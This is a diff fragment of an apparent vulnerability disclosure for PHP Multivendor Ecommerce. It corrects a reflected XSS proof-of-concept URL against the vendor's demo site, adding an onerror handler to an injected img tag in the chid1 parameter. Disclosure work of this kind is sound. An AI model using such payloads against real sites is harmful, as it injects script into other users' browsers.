@@ -10,7 +10,7 @@ Well,  when I pentest the official demo site of PHP Multivendor Ecommerce, I fou
 ###### XSS1
 
 ```
-http://www.fxwebsolution.com/demo/arthi/multivendor/category.php?chid1=40%27%22%3E123%3Cimg%20src=x%20console.log(/xss/)%3E123%3C%27%22
+http://www.fxwebsolution.com/demo/arthi/multivendor/category.php?chid1=40%27%22123%3Cimg%20src=x%20onerror=console.log(/xss/)%3E123%3C%27%22
 ```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss1.png)
